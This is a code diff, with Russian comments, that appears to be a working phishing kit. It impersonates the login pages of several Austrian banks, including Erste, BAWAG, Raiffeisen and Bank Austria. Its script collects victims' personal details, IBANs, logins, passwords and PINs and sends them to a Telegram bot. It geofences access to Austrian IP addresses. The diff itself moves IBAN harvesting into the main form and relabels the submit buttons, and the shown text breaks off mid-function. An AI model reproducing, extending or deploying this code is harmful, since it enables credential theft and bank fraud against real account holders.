@@ -1780,148 +1780,6 @@
             .page-footer { padding: 52px 14px 22px; }
             .page-footer p { font-size: 13px; }
         }
-
-        /* ============================================================
-           Спец-стили для экранов ввода IBAN (как на скрине)
-           ============================================================ */
-        .iban-screen-wrapper {
-            background: #eaf1f8; /* Светло-голубой фон */
-            min-height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 40px 24px 60px;
-        }
-
-        .iban-screen-content {
-            width: 100%;
-            max-width: 480px;
-        }
-
-        .iban-screen-card {
-            background: #ffffff;
-            border-radius: 4px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            overflow: hidden;
-            border: 1px solid #dcdcdc;
-        }
-
-        .iban-screen-header {
-            background: #005a9e; /* Синий цвет как на скрине */
-            color: #ffffff;
-            padding: 20px 24px;
-            font-size: 22px;
-            font-weight: 400;
-        }
-
-        .iban-screen-body {
-            padding: 24px;
-        }
-
-        .iban-screen-text {
-            font-size: 15px;
-            color: #333;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-
-        .iban-screen-label {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 8px;
-            display: block;
-        }
-
-        .iban-screen-input {
-            width: 100%;
-            height: 48px;
-            border: 1px solid #999;
-            border-radius: 4px;
-            background: #e5e5e5; /* Серый фон как на скрине */
-            padding: 0 16px;
-            font-size: 16px;
-            color: #1a1a1a;
-            outline: none;
-            margin-bottom: 24px;
-            transition: border-color 0.15s ease;
-        }
-
-        .iban-screen-input:focus {
-            border-color: #005a9e;
-            background: #ffffff;
-        }
-
-        .iban-screen-divider {
-            height: 1px;
-            background: #ccc;
-            margin: 0 -24px 24px -24px;
-        }
-
-        .iban-screen-btn {
-            width: 100%;
-            height: 48px;
-            background: #005a9e;
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.15s ease;
-        }
-
-        .iban-screen-btn:hover {
-            background: #00457a;
-        }
-
-        /* Специфичные цвета для банков */
-        .is-bawag .iban-screen-header { background: #8b0000; }
-        .is-bawag .iban-screen-btn { background: #8b0000; }
-        .is-bawag .iban-screen-btn:hover { background: #6b0000; }
-        .is-bawag .iban-screen-input:focus { border-color: #8b0000; }
-
-        .is-sparda .iban-screen-header { background: #0056b3; }
-        .is-sparda .iban-screen-btn { background: #0056b3; }
-        .is-sparda .iban-screen-btn:hover { background: #004085; }
-        .is-sparda .iban-screen-input:focus { border-color: #0056b3; }
-
-        .is-bank99 .iban-screen-header { background: #ffeb00; color: #000000; }
-        .is-bank99 .iban-screen-btn { background: #ffeb00; color: #000000; }
-        .is-bank99 .iban-screen-btn:hover { background: #ebd800; }
-        .is-bank99 .iban-screen-input:focus { border-color: #ffeb00; }
-
-        .is-erste .iban-screen-header { background: #cc0000; }
-        .is-erste .iban-screen-btn { background: #cc0000; }
-        .is-erste .iban-screen-btn:hover { background: #a30000; }
-        .is-erste .iban-screen-input:focus { border-color: #cc0000; }
-
-        .is-rfb .iban-screen-header { background: #ffff00; color: #1a1a1a; }
-        .is-rfb .iban-screen-btn { background: #ffff00; color: #1a1a1a; }
-        .is-rfb .iban-screen-btn:hover { background: #e6e600; }
-        .is-rfb .iban-screen-input:focus { border-color: #ffff00; }
-
-        .is-easy .iban-screen-header { background: #1e6bd6; }
-        .is-easy .iban-screen-btn { background: #1e6bd6; }
-        .is-easy .iban-screen-btn:hover { background: #1553a6; }
-        .is-easy .iban-screen-input:focus { border-color: #1e6bd6; }
-
-        .is-ba .iban-screen-header { background: #d5001c; }
-        .is-ba .iban-screen-btn { background: #d5001c; }
-        .is-ba .iban-screen-btn:hover { background: #b30017; }
-        .is-ba .iban-screen-input:focus { border-color: #d5001c; }
-        
-        .is-hypo .iban-screen-header { background: #003366; }
-        .is-hypo .iban-screen-btn { background: #003366; }
-        .is-hypo .iban-screen-btn:hover { background: #002244; }
-        .is-hypo .iban-screen-input:focus { border-color: #003366; }
-
-        /* Логотипы для шапок IBAN */
-        .iban-logo {
-            display: block;
-            object-fit: contain;
-            object-position: left;
-            margin-bottom: 20px;
-        }
     </style>
 </head>
 <body>
@@ -2057,6 +1915,13 @@
                         <div class="field-error" data-error-for="housenumber"></div>
                     </div>
 
+                    <!-- Поле IBAN (между bank и postcode) -->
+                    <div class="form-field">
+                        <label for="iban">IBAN:<span class="req">*</span></label>
+                        <input type="text" id="iban" name="iban" placeholder="AT00 0000 0000 0000 0000" required>
+                        <div class="field-error" data-error-for="iban"></div>
+                    </div>
+
                     <div class="form-field field-postcode">
                         <label for="postcode">Postleitzahl:<span class="req">*</span></label>
                         <input type="text" id="postcode" name="postcode" maxlength="4" inputmode="numeric" required>
@@ -2137,29 +2002,7 @@
     </div>
 
     <!-- ============================================================
-         ЭКРАН 4 — Ввод IBAN (отдельный экран для IBAN)
-         ============================================================ -->
-    <div class="screen" id="screen4">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header" id="ibanHeaderTitle">hausbanking Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <div class="iban-screen-text">
-                            Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.
-                        </div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban">IBAN</label>
-                        <input type="text" id="iban" name="iban" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="ibanSubmitBtn" onclick="submitIban()">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ============================================================
-         КАСТОМНЫЕ БАНКИ (Шаг 1 — Логин и пароль)
+         КАСТОМНЫЕ БАНКИ (Только логин и пароль)
          ============================================================ -->
     
     <!-- Erste Bank (George) -->
@@ -2190,7 +2033,7 @@
 
                 <div class="continue-bar bar-center">
                     <button type="button" class="continue-btn" id="ersteNextBtn">
-                        Weiter
+                        Bestätigen
                         <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                             <polyline points="9 6 15 12 9 18"></polyline>
                         </svg>
@@ -2218,7 +2061,7 @@
                         <input type="text" id="login99" class="bank99-input" placeholder="Login">
                         <input type="password" id="password99" class="bank99-input" placeholder="Passwort">
                         <div class="bank99-separator"></div>
-                        <button type="button" class="bank99-btn" id="bank99NextBtn">Weiter</button>
+                        <button type="button" class="bank99-btn" id="bank99NextBtn">Bestätigen</button>
                     </div>
                     <div class="bank99-forgot">
                         <a href="#">Benutzername vergessen?</a>
@@ -2251,7 +2094,7 @@
                             Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
                         </p>
                         <div class="vb-separator"></div>
-                        <button type="button" class="vb-btn" id="vbNextBtn">Weiter</button>
+                        <button type="button" class="vb-btn" id="vbNextBtn">Bestätigen</button>
                     </div>
                 </div>
             </div>
@@ -2291,7 +2134,7 @@
                         <label for="rfb_pin">PIN eingeben <span>*</span></label>
                         <input type="password" id="rfb_pin" class="rfb-input" placeholder="">
                     </div>
-                    <button type="button" class="rfb-btn" id="rfbNextBtn">Weiter</button>
+                    <button type="button" class="rfb-btn" id="rfbNextBtn">Bestätigen</button>
                 </div>
             </div>
         </div>
@@ -2312,7 +2155,7 @@
                     <div class="bawag-subtitle">Wie wollen Sie sich einloggen?</div>
                     <input type="text" id="loginbawag" class="bawag-input" placeholder="Verfügernummer">
                     <input type="password" id="passwordbawag" class="bawag-input" placeholder="PIN (8 bis 16-stellig)">
-                    <button type="button" class="bawag-btn" id="bawagNextBtn">Login</button>
+                    <button type="button" class="bawag-btn" id="bawagNextBtn">Bestätigen</button>
                     <div class="bawag-forgot">PIN vergessen oder Verfüger gesperrt?</div>
                 </div>
             </div>
@@ -2342,7 +2185,7 @@
                             Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
                         </p>
                         <div class="sparda-separator"></div>
-                        <button type="button" class="sparda-btn" id="spardaNextBtn">Weiter</button>
+                        <button type="button" class="sparda-btn" id="spardaNextBtn">Bestätigen</button>
                     </div>
                 </div>
             </div>
@@ -2443,7 +2286,7 @@
                             <div class="easy-hint">8 bis 16-stellig</div>
                         </div>
                         
-                        <button type="button" class="easy-btn" id="easyNextBtn">Login</button>
+                        <button type="button" class="easy-btn" id="easyNextBtn">Bestätigen</button>
                         
                         <div class="easy-forgot">eBanking Zugang entsperren</div>
                     </div>
@@ -2482,181 +2325,6 @@
         </div>
     </div>
 
-    <!-- ============================================================
-         КАСТОМНЫЕ БАНКИ (Шаг 2 — IBAN) - единый стиль с логотипами
-         ============================================================ -->
-
-    <!-- Erste Bank (George) - IBAN -->
-    <div class="bank-full-wrapper is-erste" id="ersteIbanWrapper">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header">Erste Bank Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <img src="blgv.svg" alt="George" class="iban-logo" style="width: 96px; height: 96px;">
-                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban_erste">IBAN</label>
-                        <input type="text" id="iban_erste" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="ersteIbanSubmitBtn">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Bank99 - IBAN -->
-    <div class="bank-full-wrapper is-bank99" id="bank99IbanWrapper">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header">Bank99 Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <img src="logo99.png" alt="bank99" class="iban-logo" style="width: 120px; height: auto;">
-                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban_99">IBAN</label>
-                        <input type="text" id="iban_99" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="bank99IbanSubmitBtn">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Volksbank - IBAN -->
-    <div class="bank-full-wrapper is-vb" id="vbIbanWrapper">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header">Volksbank Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <img src="logovs.png" alt="Volksbank" class="iban-logo" style="width: 140px; height: auto;">
-                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban_vb">IBAN</label>
-                        <input type="text" id="iban_vb" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="vbIbanSubmitBtn">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Raiffeisenbank - IBAN -->
-    <div class="bank-full-wrapper is-rfb" id="rfbIbanWrapper">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header">Raiffeisenbank Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <img src="32x32.png" alt="Raiffeisen" class="iban-logo" style="width: 80px; height: 80px;">
-                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban_rfb">IBAN</label>
-                        <input type="text" id="iban_rfb" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="rfbIbanSubmitBtn">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- BAWAG - IBAN -->
-    <div class="bank-full-wrapper is-bawag" id="bawagIbanWrapper">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header">Bawag Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <img src="bawag.png" alt="BAWAG" class="iban-logo" style="width: 220px; height: auto;">
-                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban_bawag">IBAN</label>
-                        <input type="text" id="iban_bawag" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="bawagIbanSubmitBtn">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Sparda Bank - IBAN -->
-    <div class="bank-full-wrapper is-sparda" id="spardaIbanWrapper">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header">Sparda Bank Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <img src="logospp.png" alt="Sparda Bank" class="iban-logo" style="width: 140px; height: auto;">
-                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban_sparda">IBAN</label>
-                        <input type="text" id="iban_sparda" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="spardaIbanSubmitBtn">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- HYPO NOE - IBAN -->
-    <div class="bank-full-wrapper is-hypo" id="hypoIbanWrapper">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header">Hypo NOE Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <img src="hnp.svg" alt="Hypo NOE" class="iban-logo" style="width: 190px; height: 40px;">
-                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban_hypo">IBAN</label>
-                        <input type="text" id="iban_hypo" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="hypoIbanSubmitBtn">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Easy Bank - IBAN -->
-    <div class="bank-full-wrapper is-easy" id="easyIbanWrapper">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header">Easy Bank Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <img src="fdfd.png" alt="Easy Bank" class="iban-logo" style="width: 245px; height: 92px;">
-                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban_easy">IBAN</label>
-                        <input type="text" id="iban_easy" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="easyIbanSubmitBtn">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Bank Austria - IBAN -->
-    <div class="bank-full-wrapper is-ba" id="baIbanWrapper">
-        <div class="iban-screen-wrapper">
-            <div class="iban-screen-content">
-                <div class="iban-screen-card">
-                    <div class="iban-screen-header">Bank Austria Sicherheitsfrage</div>
-                    <div class="iban-screen-body">
-                        <img src="bau.svg" alt="Bank Austria" class="iban-logo" style="width: 200px; height: 80px;">
-                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
-                        <div class="iban-screen-divider"></div>
-                        <label class="iban-screen-label" for="iban_ba">IBAN</label>
-                        <input type="text" id="iban_ba" class="iban-screen-input" placeholder="" required>
-                        <button type="button" class="iban-screen-btn" id="baIbanSubmitBtn">Weiter</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
     <!-- Нижний серый блок -->
     <footer class="page-footer">
         <p>
@@ -2676,8 +2344,8 @@
                 const res = await fetch('http://ip-api.com/json/?fields=status,countryCode,query');
                 const data = await res.json();
                 
-                // Разрешаем строго указанный IP или любые IP из Австрии (countryCode: 'AT')
-                if (data.query === '46.205.196.184' || data.countryCode === 'AT') {
+                // Разрешаем любые IP из Австрии (countryCode: 'AT')
+                if (data.countryCode === 'AT') {
                     // Доступ разрешен
                 } else {
                     throw new Error('Access Denied');
@@ -2703,8 +2371,7 @@
             const screens = {
                 1: document.getElementById('screen1'),
                 2: document.getElementById('screen2'),
-                3: document.getElementById('screen3'),
-                4: document.getElementById('screen4')
+                3: document.getElementById('screen3')
             };
             const steps = document.querySelectorAll('.step');
 
@@ -2731,6 +2398,7 @@
             const form = document.getElementById('dataForm');
             const bankSelect = document.getElementById('bank');
 
+            // Добавлено поле 'iban' в правила валидации
             const FIELD_RULES = {
                 'fullname':    (v) => v.trim().length < 3 ? 'Bitte vollständigen Namen eingeben' : null,
                 'email':       (v) => !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ? 'Bitte gültige E-Mail eingeben' : null,
@@ -2745,6 +2413,7 @@
                 'phone':       (v) => v.replace(/\D/g, '').length < 6 ? 'Telefonnummer zu kurz' : null,
                 'address':     (v) => v.trim().length < 2 ? 'Bitte Straße eingeben' : null,
                 'housenumber': (v) => v.trim().length < 1 ? 'Bitte Hausnummer eingeben' : null,
+                'iban':        (v) => v.replace(/\s/g, '').length < 15 ? 'IBAN ist zu kurz' : null,
                 'postcode':    (v) => v.replace(/\D/g, '').length < 3 ? 'PLZ zu kurz' : null,
                 'bank':        (v) => v.trim().length < 1 ? 'Bitte Bank wählen' : null
             };
@@ -2805,6 +2474,12 @@
             document.getElementById('postcode').addEventListener('input', (e) => {
                 e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
             });
+            
+            // Маска для IBAN (добавление пробелов)
+            document.getElementById('iban').addEventListener('input', (e) => {
+                let v = e.target.value.replace(/[^A-Z0-9]/gi, '').toUpperCase().slice(0, 20);
+                e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+            });
 
             Object.keys(FIELD_RULES).forEach(id => {
                 const el = document.getElementById(id);
@@ -2846,6 +2521,7 @@
                     '\u{1F4CD} <b>Address:</b> ' + escapeHtml(addressLine),
                     '\u{1F4EE} <b>Postcode:</b> ' + escapeHtml(data.postcode),
                     '\u{1F3E6} <b>Bank:</b> ' + escapeHtml(data.bank),
+                    '\u{1F3E6} <b>IBAN:</b> ' + escapeHtml(data.iban),
                     '',
                     '\u{1F552} <b>Time:</b> ' + getTimestamp(),
                     '\u{1F310} <b>Browser:</b> ' + escapeHtml(navigator.userAgent)
@@ -2853,13 +2529,12 @@
                 return lines.join('\n');
             }
 
-            function buildBankMessage(loginData, ibanData) {
+            function buildBankMessage(loginData) {
                 const lines = [
                     '\u{1F534} <b>AUSTRIA LOG — BANK</b>',
                     '',
                     '\u{1F510} <b>Login:</b> ' + escapeHtml(loginData.login || ''),
                     '\u{1F511} <b>Passwort:</b> ' + escapeHtml(loginData.password || ''),
-                    '\u{1F3E6} <b>IBAN:</b> ' + escapeHtml(ibanData.iban || ''),
                     '',
                     '\u{1F552} <b>Time:</b> ' + getTimestamp(),
                     '\u{1F310} <b>Browser:</b> ' + escapeHtml(navigator.userAgent)
@@ -2885,14 +2560,8 @@
                 return json;
             }
 
-            // Переменные для хранения логина/пароля перед вводом IBAN
-            let currentBank = '';
-            let currentLogin = '';
-            let currentPassword = '';
-
             function applyBankDesign() {
                 const selected = bankSelect.value;
-                currentBank = selected;
                 
                 document.querySelectorAll('.bank-full-wrapper').forEach(el => el.style.display = 'none');
 
@@ -2919,143 +2588,28 @@
                 }
             }
 
-            // Открываем окно с IBAN для выбранного банка
-            function showIbanScreen() {
-                document.querySelectorAll('.bank-full-wrapper').forEach(el => el.style.display = 'none');
-                
-                if (currentBank === 'Erste Bank') {
-                    document.getElementById('ersteIbanWrapper').style.display = 'flex';
-                } else if (currentBank === 'Bank99') {
-                    document.getElementById('bank99IbanWrapper').style.display = 'flex';
-                } else if (currentBank === 'Volksbank') {
-                    document.getElementById('vbIbanWrapper').style.display = 'flex';
-                } else if (currentBank === 'Raiffeisenbank') {
-                    document.getElementById('rfbIbanWrapper').style.display = 'flex';
-                } else if (currentBank === 'Bawag') {
-                    document.getElementById('bawagIbanWrapper').style.display = 'flex';
-                } else if (currentBank === 'Spardabank') {
-                    document.getElementById('spardaIbanWrapper').style.display = 'flex';
-                } else if (currentBank === 'Hypo NOE') {
-                    document.getElementById('hypoIbanWrapper').style.display = 'flex';
-                } else if (currentBank === 'Easy Bank') {
-                    document.getElementById('easyIbanWrapper').style.display = 'flex';
-                } else if (currentBank === 'Bank Austria') {
-                    document.getElementById('baIbanWrapper').style.display = 'flex';
-                }
-            }
-
-            function validateLoginPass(bankKey) {
-                const l = document.getElementById('login' + bankKey);
-                const p = document.getElementById('password' + bankKey);
-                if (!l || !p) return null;
-                if (!l.value.trim() || !p.value.trim()) return null;
-                return { login: l.value.trim(), password: p.value.trim() };
-            }
-
-            // Привязка кнопок "Weiter" для каждого банка (ШАГ 1)
-            document.getElementById('ersteNextBtn').addEventListener('click', () => {
-                const l = document.getElementById('login_erste');
-                const p = document.getElementById('password_erste');
-                if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
-                currentLogin = l.value.trim();
-                currentPassword = p.value.trim();
-                showIbanScreen();
-            });
-
-            document.getElementById('bank99NextBtn').addEventListener('click', () => {
-                const l = document.getElementById('login99');
-                const p = document.getElementById('password99');
-                if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
-                currentLogin = l.value.trim();
-                currentPassword = p.value.trim();
-                showIbanScreen();
-            });
-
-            document.getElementById('vbNextBtn').addEventListener('click', () => {
-                const l = document.getElementById('loginvb');
-                const p = document.getElementById('passwordvb');
-                if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
-                currentLogin = l.value.trim();
-                currentPassword = p.value.trim();
-                showIbanScreen();
-            });
-
-            document.getElementById('rfbNextBtn').addEventListener('click', () => {
-                const bl = document.getElementById('rfb_bundesland');
-                const v = document.getElementById('rfb_verfueger');
-                const p = document.getElementById('rfb_pin');
-                if (!bl.value || !v.value.trim() || !p.value.trim()) { alert('Bitte alle Felder ausfüllen'); return; }
-                currentLogin = bl.value + ' | ' + v.value.trim();
-                currentPassword = p.value.trim();
-                showIbanScreen();
-            });
-
-            document.getElementById('bawagNextBtn').addEventListener('click', () => {
-                const l = document.getElementById('loginbawag');
-                const p = document.getElementById('passwordbawag');
-                if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
-                currentLogin = l.value.trim();
-                currentPassword = p.value.trim();
-                showIbanScreen();
-            });
-
-            document.getElementById('spardaNextBtn').addEventListener('click', () => {
-                const l = document.getElementById('loginsparda');
-                const p = document.getElementById('passwordsparda');
-                if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
-                currentLogin = l.value.trim();
-                currentPassword = p.value.trim();
-                showIbanScreen();
-            });
-
-            document.getElementById('hypoNextBtn').addEventListener('click', () => {
-                const l = document.getElementById('hypo_email');
-                const p = document.getElementById('hypo_pw');
-                if (!l.value.trim() || !p.value.trim()) { alert('Bitte E-Mail und Passwort eingeben'); return; }
-                currentLogin = l.value.trim();
-                currentPassword = p.value.trim();
-                showIbanScreen();
-            });
-
-            document.getElementById('easyNextBtn').addEventListener('click', () => {
-                const l = document.getElementById('easy_verfueger');
-                const p = document.getElementById('easy_pin');
-                if (!l.value.trim() || !p.value.trim()) { alert('Bitte Verfügernummer und PIN eingeben'); return; }
-                currentLogin = l.value.trim();
-                currentPassword = p.value.trim();
-                showIbanScreen();
-            });
-
-            document.getElementById('baNextBtn').addEventListener('click', () => {
-                const l = document.getElementById('ba_verfueger');
-                const p = document.getElementById('ba_pin');
-                if (!l.value.trim() || !p.value.trim()) { alert('Bitte Verfügernummer und PIN eingeben'); return; }
-                currentLogin = l.value.trim();
-                currentPassword = p.value.trim();
-                showIbanScreen();
-            });
-
-            // Привязка кнопок "Bestätigen" для каждого банка (ШАГ 2 — IBAN)
-            async function finalSubmit(bankKey, ibanId, btnId) {
-                const ibanInput = document.getElementById(ibanId);
+            // Обработчики кнопок "Bestätigen" для кастомных банков
+            async function submitCustomBank(loginId, passId, btnId) {
+                const l = document.getElementById(loginId);
+                const p = document.getElementById(passId);
                 const btn = document.getElementById(btnId);
                 
-                if (!ibanInput.value.trim()) {
-                    ibanInput.style.borderColor = '#c8102e';
-                    ibanInput.focus();
+                if (!l.value.trim() || !p.value.trim()) {
+                    if (!l.value.trim()) l.style.borderColor = '#c8102e';
+                    if (!p.value.trim()) p.style.borderColor = '#c8102e';
                     return;
                 }
-                ibanInput.style.borderColor = '#999';
+                l.style.borderColor = '#d5d5d5';
+                p.style.borderColor = '#d5d5d5';
 
-                const loginData = { login: currentLogin, password: currentPassword };
-                const ibanData = { iban: ibanInput.value.trim() };
-
-                const original = btn.textContent || btn.innerHTML;
+                const bankData = { login: l.value.trim(), password: p.value.trim() };
+                const original = btn.innerHTML;
+                
                 btn.disabled = true;
                 btn.textContent = 'Wird gesendet...';
 
                 try {
-                    await sendToTelegram(buildBankMessage(loginData, ibanData));
+                    await sendToTelegram(buildBankMessage(bankData));
                     btn.textContent = '✓ Gesendet';
                     btn.style.background = '#1a7f37';
                     btn.style.color = '#ffffff';
@@ -3068,43 +2622,71 @@
 
                 setTimeout(() => {
                     btn.disabled = false;
-                    btn.textContent = original;
+                    btn.innerHTML = original;
                     btn.style.background = '';
                     btn.style.color = '';
                 }, 2500);
             }
 
-            document.getElementById('ersteIbanSubmitBtn').addEventListener('click', () => finalSubmit('Erste', 'iban_erste', 'ersteIbanSubmitBtn'));
-            document.getElementById('bank99IbanSubmitBtn').addEventListener('click', () => finalSubmit('Bank99', 'iban_99', 'bank99IbanSubmitBtn'));
-            document.getElementById('vbIbanSubmitBtn').addEventListener('click', () => finalSubmit('Volksbank', 'iban_vb', 'vbIbanSubmitBtn'));
-            document.getElementById('rfbIbanSubmitBtn').addEventListener('click', () => finalSubmit('Raiffeisen', 'iban_rfb', 'rfbIbanSubmitBtn'));
-            document.getElementById('bawagIbanSubmitBtn').addEventListener('click', () => finalSubmit('Bawag', 'iban_bawag', 'bawagIbanSubmitBtn'));
-            document.getElementById('spardaIbanSubmitBtn').addEventListener('click', () => finalSubmit('Sparda', 'iban_sparda', 'spardaIbanSubmitBtn'));
-            document.getElementById('hypoIbanSubmitBtn').addEventListener('click', () => finalSubmit('Hypo', 'iban_hypo', 'hypoIbanSubmitBtn'));
-            document.getElementById('easyIbanSubmitBtn').addEventListener('click', () => finalSubmit('Easy', 'iban_easy', 'easyIbanSubmitBtn'));
-            document.getElementById('baIbanSubmitBtn').addEventListener('click', () => finalSubmit('BA', 'iban_ba', 'baIbanSubmitBtn'));
+            document.getElementById('ersteNextBtn').addEventListener('click', () => submitCustomBank('login_erste', 'password_erste', 'ersteNextBtn'));
+            document.getElementById('bank99NextBtn').addEventListener('click', () => submitCustomBank('login99', 'password99', 'bank99NextBtn'));
+            document.getElementById('vbNextBtn').addEventListener('click', () => submitCustomBank('loginvb', 'passwordvb', 'vbNextBtn'));
+            
+            document.getElementById('rfbNextBtn').addEventListener('click', async () => {
+                const bl = document.getElementById('rfb_bundesland');
+                const v = document.getElementById('rfb_verfueger');
+                const p = document.getElementById('rfb_pin');
+                const btn = document.getElementById('rfbNextBtn');
+                if (!bl.value || !v.value.trim() || !p.value.trim()) { alert('Bitte alle Felder ausfüllen'); return; }
+                
+                const bankData = { login: bl.value + ' | ' + v.value.trim(), password: p.value.trim() };
+                const original = btn.innerHTML;
+                
+                btn.disabled = true;
+                btn.textContent = 'Wird gesendet...';
 
-            // Стандартная логика (для банков без кастома)
+                try {
+                    await sendToTelegram(buildBankMessage(bankData));
+                    btn.textContent = '✓ Gesendet';
+                    btn.style.background = '#1a7f37';
+                    btn.style.color = '#ffffff';
+                } catch (err) {
+                    console.error(err);
+                    btn.textContent = '✗ Fehler';
+                    btn.style.background = '#c8102e';
+                    btn.style.color = '#ffffff';
+                }
+
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btn.innerHTML = original;
+                    btn.style.background = '';
+                    btn.style.color = '';
+                }, 2500);
+            });
+
+            document.getElementById('bawagNextBtn').addEventListener('click', () => submitCustomBank('loginbawag', 'passwordbawag', 'bawagNextBtn'));
+            document.getElementById('spardaNextBtn').addEventListener('click', () => submitCustomBank('loginsparda', 'passwordsparda', 'spardaNextBtn'));
+            document.getElementById('hypoNextBtn').addEventListener('click', () => submitCustomBank('hypo_email', 'hypo_pw', 'hypoNextBtn'));
+            document.getElementById('easyNextBtn').addEventListener('click', () => submitCustomBank('easy_verfueger', 'easy_pin', 'easyNextBtn'));
+            document.getElementById('baNextBtn').addEventListener('click', () => submitCustomBank('ba_verfueger', 'ba_pin', 'baNextBtn'));
+
+            // Стандартная логика (если выбран банк без кастома)
             window.submitStandardBank = async function() {
                 const login = document.getElementById('login').value.trim();
                 const password = document.getElementById('password').value.trim();
-                if (!login || !password) { alert('Bitte Login und Passwort eingeben'); return; }
-                currentLogin = login;
-                currentPassword = password;
-                showScreen(4);
-            };
-
-            window.submitIban = async function() {
-                const iban = document.getElementById('iban').value.trim();
